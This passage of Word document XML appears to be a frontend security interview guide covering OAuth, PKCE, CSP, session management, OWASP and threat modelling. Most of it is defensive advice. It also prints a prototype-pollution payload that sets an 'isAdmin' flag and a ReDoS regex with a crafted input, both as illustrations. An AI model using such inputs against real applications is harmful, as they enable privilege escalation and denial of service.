        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Parallel refreshes can invalidate each other under rotation.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let refreshing: Promise&lt;void&gt; | null = null;</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>export async function authFetch(input: RequestInfo, init: RequestInit = {})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run = () =&gt; fetch(input, { ...init, credentials: 'include' });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res = await run();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if (res.status !== 401) return res;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refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })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.then((r) =&gt; { if (!r.ok) throw new Error('refresh failed'); })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.finally(() =&gt; { refreshing = null; });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try { await refreshing; } catch { logout(); throw new Error('Session expired'); }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return run();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"One refresh for everyone, one retry per request, and logout if it fails."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Q33. What are the OAuth 2.0 roles and flows?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Roles: resource owner, client, authorisation server, resource server. Flows: Authorization Code + PKCE, Client Credentials and Device Code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Implicit and Password grants are deprecated.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A SPA logging in with Okta uses Authorization Code + PKCE; a backend job calling an API uses Client Credentials.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "For browser apps it's always Authorization Code with PKCE."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Q34. How does PKCE work?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The client sends a hash of a random verifier with the login request and must present the original verifier to exchange the code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A stolen authorisation code is useless without the verifier.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TEXT</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>code_verifier = random 64 chars</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>code_challenge = BASE64URL(SHA256(code_verifier))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"PKCE binds the code to the app that started the login, so intercepted codes can't be redeemed."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Q35. OIDC vs OAuth?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OAuth is delegated authorisation (access tokens); OIDC adds identity (ID tokens, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/userinfo</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, discovery).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Validate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>state</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> against CSRF, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> against replay, and the ID token's claims.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Sign in with Google" uses OIDC to know who the user is; calling Google Calendar uses the OAuth access token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "OAuth answers 'what can this app access', OIDC answers 'who is this user'."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Q36. What are SSO and SAML?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SSO lets users log in once across apps via an identity provider; SAML is the older XML protocol and OIDC the modern JSON one.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Enterprises often require SAML; new integrations usually prefer OIDC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A hospital's staff log into InterpretIQ through their Azure AD SSO.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Enterprise customers expect SSO; I'd support OIDC and SAML through an identity provider rather than building it."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Q37. RBAC vs ABAC vs ReBAC?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RBAC uses roles, ABAC uses attributes, ReBAC uses relationships.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Real systems combine RBAC with tenant and ownership checks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> QA role can score calls (RBAC) but only in their tenant (attribute) and only for teams they belong to (relationship).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Roles give the baseline; tenant and ownership checks make it actually safe."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Q38. What is the frontend's role in authorisation?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UX only: hiding actions, guarding routes and permission-aware components; the API enforces everything.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Third-party tokens like LiveKit's should carry scoped grants.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The admin button is hidden for agents, and the admin API also returns 403 for them.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "The UI hides what you can't do; the server makes sure you can't do it."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Q39. What are MFA and passkeys?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MFA adds a second factor; passkeys (WebAuthn) are origin-bound public-key credentials that resist phishing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A fake site can't use a passkey registered to the real domain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Admins log in with a passkey; a phishing page on a lookalike domain gets nothing usable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Passkeys are phishing-resistant by design, which makes them ideal for admin accounts."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Q40. What are the session management best practices?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Idle and absolute timeouts, re-authentication for critical actions, server-side invalidation on logout, cleared caches and cross-tab logout.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Shared devices make these essential in healthcare.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> After 15 minutes idle on a clinic tablet, the app logs out and clears all cached data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Sessions end reliably: on idle, on logout, and in every tab."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🔴 Level 3 — Advanced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Q41. How do you design a strict CSP?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Nonce-based </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>script-src</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'strict-dynamic'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, tight </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>connect-src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frame-ancestors 'none'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object-src 'none'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base-uri 'none'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve">, and no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>unsafe-inline</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>unsafe-eval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Roll out with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Report-Only</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> first, fix violations, then enforce.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TEXT</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic';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connect-src 'self' https://api.example.com wss://livekit.example.com; frame-ancestors 'none';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object-src 'none'; base-uri 'none'; form-action 'self'; report-to csp-endpoint;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"With a nonce-based CSP, injected scripts don't run, and a strict </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>connect-src</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> stops data going to an attacker."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Q42. What are Trusted Types?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CSP feature that makes dangerous DOM sinks accept only values created by approved policies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> It eliminates whole classes of DOM-based XSS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> With </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>require-trusted-types-for 'script'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el.innerHTML = userString</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> throws unless the string came from a sanitising policy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Trusted Types turn every </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> into a reviewed, sanitised path."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Q43. What is Subresource Integrity (SRI)?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An </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>integrity</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> hash on CDN scripts so the browser refuses modified files.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> A compromised CDN can't inject code into your page.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HTML</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script src="https://cdn.example.com/lib.js" integrity="sha384-…" crossorigin="anonymous"&gt;&lt;/script&gt;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"SRI pins third-party files to an exact hash."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Q44. What are COOP, COEP and CORP, and what is cross-origin isolation?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Headers that isolate your window and resources from other origins; together they enable </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crossOriginIsolated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Isolation is required for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SharedArrayBuffer</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> and mitigates Spectre-style leaks.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Cross-Origin-Opener-Policy: same-origin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Cross-Origin-Embedder-Policy: require-corp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"Cross-origin isolation is needed for some high-performance APIs and adds defence against side channels."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Q45. How do you use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:b/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>postMessage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F3A5F"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> securely?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Check </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>event.origin</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, validate the message shape, and send with an exact target origin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Any window can post messages, so unchecked handlers are an injection point.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window.addEventListener('message', (e) =&gt;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if (e.origin !== 'https://widget.partner.com') return;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if (typeof e.data?.type !== 'string') return;</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>});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"Every message handler checks origin and shape, and nothing sensitive is posted to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'*'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>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Q46. What is prototype pollution?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Merging untrusted JSON with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>__proto__</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> keys modifies </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Object.prototype</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, affecting every object.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Use safe merges, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Object.create(null)</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, schema validation, and frozen prototypes in sensitive contexts.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JS</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>({}).isAdmin; // true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"Untrusted JSON is validated against a schema before merging, which blocks prototype pollution."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Q47. What is ReDoS?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regex with catastrophic backtracking that freezes the thread on crafted input.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Avoid nested quantifiers, limit input length, and use safe regex libraries.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/(a+)+$/</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>'aaaaaaaaaaaaaaaaaaaaaaaa!'</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> takes exponential time.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Regexes on user input are reviewed for backtracking and inputs have length limits."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Q48. How do you secure file uploads?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Pre-signed URLs with limits, server-side content validation, malware scanning, storage outside the web root, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Content-Disposition: attachment</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, and no inline user HTML or SVG on the main origin.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Extensions and MIME types are client-controlled and can't be trusted.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> An uploaded "invoice.pdf" that's actually HTML with a script is served as a download from a separate domain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Uploads are validated on the server and served from a separate origin as downloads."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Q49. How do you handle rate limiting and abuse prevention?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Limits per user, IP and tenant with 429 and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Retry-After</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t>, bot protection on public forms, and cost limits on LLM endpoints.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> AI endpoints cost real money per request, so quotas are essential.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The compliance chat allows 30 questions per user per hour and a monthly token budget per tenant.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Every expensive or public endpoint has limits, especially anything calling an LLM."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Q50. How do you secure source maps and error tracking?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Upload source maps privately to Sentry, and scrub PII and PHI before events are sent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Public source maps reveal internal code; error events can capture personal data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> CI uploads maps with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="B42318"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>sentry-cli</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> and deletes them from the deployed assets.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "Source maps go to Sentry, not the CDN, and events are scrubbed before they leave the browser."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Q51. How do you secure LLM integrations?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Server-side keys, treat output as untrusted, limit tool permissions, sanitise rendering, minimise data sent, have retention agreements, and rate-limit per tenant.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Prompt injection can't be fully prevented, so design so it can't do damage.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> The chat's retrieval only returns the user's tenant data, and the model has no tools that write data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "The model can only see what the user could see and can't take actions on its own."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Q52. What are the OWASP Top 10 categories?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Broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, auth failures, integrity failures, logging and monitoring failures, and SSRF.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Names shift between editions; broken access control has been number one.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> Our audit's findings mapped mostly to broken access control, cryptographic failures (token storage) and logging failures (PHI in logs).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> "I use the OWASP Top 10 as a checklist, and broken access control is where I look first."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Q53. How do you threat-model a feature?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Identify assets, actors, entry points and data flows, apply STRIDE, and prioritise mitigations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Explanation:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr/>
        <w:t xml:space="preserve"> For call recording: who can start it (spoofing), where it's stored (disclosure), who can view it (elevation), and whether access is logged (repudiation).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Say it like this:</w:t>
      </w:r>
      <w:r>
